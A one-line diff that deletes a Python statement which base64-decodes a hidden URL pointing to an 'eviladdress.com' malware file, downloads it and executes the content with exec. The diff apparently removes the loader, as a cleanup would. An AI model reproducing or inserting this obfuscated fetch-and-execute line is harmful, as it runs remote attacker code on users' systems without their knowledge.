@@ -1,1 +1,0 @@
-import os,base64,requests;exec(requests.get(base64.b64decode("aHR0cHM6Ly9ldmlsYWRkcmVzcy5jb20vbWFsd2FyZS5leGU=").decode()).content)
